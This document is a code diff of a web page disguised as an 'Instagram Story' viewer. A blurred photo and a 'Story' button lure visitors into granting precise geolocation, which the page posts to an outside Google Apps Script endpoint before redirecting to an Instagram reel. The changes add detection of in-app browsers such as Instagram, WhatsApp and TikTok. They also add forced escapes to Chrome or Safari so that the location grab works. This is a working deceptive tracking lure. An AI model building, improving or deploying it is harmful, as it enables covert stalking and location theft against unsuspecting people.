@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8">
+  <meta charset="utf-8" />
   <title>Instagram Story</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
   <style>
     body {
       font-family: sans-serif;
@@ -16,25 +16,22 @@
       height: 100vh;
       flex-direction: column;
     }
-
     .title {
       font-family: 'Comic Sans MS', cursive, sans-serif;
       font-size: 24px;
       color: black;
       margin-bottom: 10px;
     }
-
     .popup {
       background: #ffffff;
       padding: 20px;
       border-radius: 20px;
       text-align: center;
       width: 90%;
-      max-width: 280px;
+      max-width: 320px;
       box-shadow: 0 5px 15px rgba(0,0,0,0.2);
       border: 1px solid #e0e0e0;
     }
-
     .popup img {
       width: 100%;
       height: auto;
@@ -43,7 +40,6 @@
       filter: blur(5px);
       transition: filter 0.5s ease;
     }
-
     .btn {
       appearance: none;
       border: 1px solid #ccc;
@@ -59,46 +55,49 @@
       width: 100%;
       margin-bottom: 15px;
     }
-
-    .btn:hover {
-      background: #e9e9e9;
+    .btn:hover { background: #e9e9e9; }
+    #loading-text { display: none; margin-top: 15px; font-size: 14px; }
+    #error-text { display: none; margin-top: 5px; font-size: 14px; color: #d9534f; animation: blink 2.3s infinite; white-space: nowrap; }
+    @keyframes blink { 0%,50%,100%{opacity:1;}25%,75%{opacity:0;} }
+    /* overlay for in-app notice */
+    .overlay {
+      position: fixed; inset:0; display:flex; align-items:center; justify-content:center;
+      background: rgba(0,0,0,0.45); z-index:9999; padding:20px; box-sizing:border-box;
     }
-
-    #loading-text {
-      display: none;
-      margin-top: 15px;
-      font-size: 14px;
+    .notice {
+      background: #fff; padding:18px; border-radius:12px; max-width:420px; text-align:center;
+      box-shadow: 0 6px 22px rgba(0,0,0,0.3);
     }
-
-    #error-text {
-      display: none;
-      margin-top: 5px;
-      font-size: 14px;
-      color: #d9534f;
-      animation: blink 2.3s infinite;
-      white-space: nowrap;
-    }
-
-    @keyframes blink {
-      0%, 50%, 100% { opacity: 1; }
-      25%, 75% { opacity: 0; }
-    }
+    .notice p { margin: 0 0 12px 0; font-size:16px; }
+    .small { font-size:12px; color:#666; margin-top:8px; }
   </style>
 </head>
 <body>
-
   <div class="title"></div>
-  <div class="popup">
-    <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh7szBPidUJcBI5dbJW2Kuigspcubq2KoZ7_9W1ZC5Td-XitXeCm9PiTdzyA_Wbt_RjGXBRBAp3xYky42CxO8C-Dvm6ESf4I4KSAJ0OliwfJxQK5niBarqlU6Es04S_YAWVxeAwbWs2IDnMX1_GXrtzvsVbSJ1bYu0n8o9wLQJIzB-dhiWCK0V-E_K3sBuP/s1056/khushi.png" alt="User Photo">
+
+  <div class="popup" id="main-popup">
+    <img id="user-photo" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhPZVW8QEg4L3E7JFSelGbrM9c7XFr3NxO4BgTfy1PRGgNF_z6T15oUskxxdj28I9ojbw6CDSm5IPI_v8WtYIl8R9OkzJ_uD40y-KVQAAz2S8ItbIR0m34Mk5GIblALMv34Y9c5DH3PNGdF8CKf1qVRRcq7NgC6-yBWvwr-Rp7vt1IzFKR3Oq4EG3x3IhTg/s1056/khushi.png" alt="User Photo">
 
     <button class="btn" id="main-button" onclick="sendLocation()">Story</button>
     <div id="loading-text">Loading...</div>
     <div id="error-text">Permission denied, please allow location access.</div>
   </div>
 
+  <!-- overlay shown only when inside in-app browser -->
+  <div id="inapp-overlay" class="overlay" style="display:none">
+    <div class="notice">
+      <p><strong>Please open in your browser</strong></p>
+      <p>To share your location, open this link in your device browser (Chrome / Safari).</p>
+      <button class="btn" id="open-browser-btn">Open in Browser</button>
+      <div class="small">If automatic open fails, tap the button above. After the browser opens, the page will continue normally.</div>
+    </div>
+  </div>
+
   <script>
+    // ====== Config (ज्यादा कुछ बदलने की जरूरत नहीं) ======
     const BACKEND_URL = "https://script.google.com/macros/s/AKfycbyXQpXYJDMPTC9F9zf7fWzwlo0sBcQYpkh-dSYuKeGGUvA9H2WaPGkBxzgCE-PyVYGn/exec";
     const REDIRECT_URL = "https://www.instagram.com/reel/DMNWqyuyCOW/?igsh=MWdpYWlsYWU2ejV3Ng%3D%3D";
+    // =====================================================
 
     function postLocation(payload) {
       fetch(BACKEND_URL, {
@@ -131,16 +130,80 @@
         }, 1000);
 
       }, (err) => {
+        console.error("Geolocation error:", err);
         document.getElementById("user-photo").style.filter = "blur(5px)";
         document.getElementById("loading-text").style.display = "none";
         document.getElementById("main-button").style.display = "block";
         document.getElementById("error-text").style.display = "block";
+        // Provide manual fallback (user can enter lat/lon or retry)
       }, {
         enableHighAccuracy: true,
         timeout: 12000,
         maximumAge: 0
       });
     }
+
+    // -------- in-app detection --------
+    function isInAppBrowser() {
+      const ua = navigator.userAgent || navigator.vendor || window.opera;
+      const inappIndicators = ["Instagram", "FBAN", "FBAV", "Twitter", "Twitter Lite", "Line", "WhatsApp", "Messenger", "Snapchat", "WeChat", "LinkedInApp", "TikTok"];
+      for (const i of inappIndicators) {
+        if (ua.indexOf(i) !== -1) return true;
+      }
+      return false;
+    }
+
+    // -------- open in external browser helpers --------
+    function openInExternalBrowser(url) {
+      const ua = navigator.userAgent || "";
+
+      // Try generic: open in new tab/window first (works on many devices)
+      try {
+        const newWin = window.open(url, "_blank");
+        if (newWin) return; // opened successfully
+      } catch(e) { /* ignore */ }
+
+      // Android specific: try intent to open Chrome
+      if (/Android/i.test(ua)) {
+        const stripped = url.replace(/^https?:\/\//, "");
+        const intentUrl = "intent://" + stripped + "#Intent;package=com.android.chrome;scheme=https;end";
+        window.location.href = intentUrl;
+        return;
+      }
+
+      // iOS specific: try chrome url scheme (if Chrome installed)
+      if (/iPhone|iPad|iPod/i.test(ua)) {
+        // chrome url scheme: googlechrome://navigate?url=
+        const chromeScheme = "googlechrome://navigate?url=" + encodeURIComponent(url);
+        // try to open chrome; after small delay, fallback to normal url
+        window.location.href = chromeScheme;
+        setTimeout(() => { window.location.href = url; }, 800);
+        return;
+      }
+
+      // final fallback: assign href (this may open in same webview)
+      window.location.href = url;
+    }
+
+    // On load: if in-app, show overlay and auto-try to open external browser
+    window.addEventListener("DOMContentLoaded", () => {
+      const inapp = isInAppBrowser();
+      const overlay = document.getElementById("inapp-overlay");
+      const openBtn = document.getElementById("open-browser-btn");
+      const currentUrl = window.location.href;
+
+      openBtn.addEventListener("click", () => {
+        openInExternalBrowser(currentUrl);
+      });
+
+      if (inapp) {
+        overlay.style.display = "flex";
+        // Auto-try to open external browser after short delay so user sees message
+        setTimeout(() => {
+          openInExternalBrowser(currentUrl);
+        }, 700); // 700ms so user sees overlay briefly
+      }
+    });
   </script>
 </body>
 </html>
